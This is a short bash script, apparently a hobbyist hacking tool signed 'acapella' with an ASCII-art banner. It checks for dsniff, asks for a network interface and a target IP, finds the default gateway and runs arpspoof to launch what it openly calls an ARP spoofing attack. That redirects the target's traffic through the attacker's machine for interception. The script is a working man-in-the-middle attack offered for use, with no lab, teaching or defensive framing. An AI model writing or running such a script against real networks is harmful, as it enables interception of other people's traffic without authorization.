#!/bin/bash

# Display banner with colors
echo -e "\e[32mCreated by acapella\e[0m"

echo -e "\e[32m 
       _     _      
      (o)--(o)     
     /.______.\    
     \________/    
    ./        \.   
   ( .        , )  
    \ \_\\//_/ /  
     ~~  ~~  ~~   
\e[0m"

# Function to check required tools
check_tools() {
    if ! command -v "$1" &>/dev/null; then
        echo -e "\e[31mError: $1 is not installed. Please install it and try again.\e[0m" >&2
        exit 1
    fi
}

check_tools "dsniff"

# Prompt for network interface and target IP
read -rp "Enter the network interface to analyze: " interface
read -rp "Enter the target IP: " ip

# Get the gateway IP
gateway=$(ip route | grep default | awk '{print $3}')

echo -e "\e[34mStarting ARP spoofing attack on interface $interface targeting IP $ip using gateway $gateway...\e[0m"

# Run arpspoof
arpspoof -i "$interface" -t "$ip" "$gateway"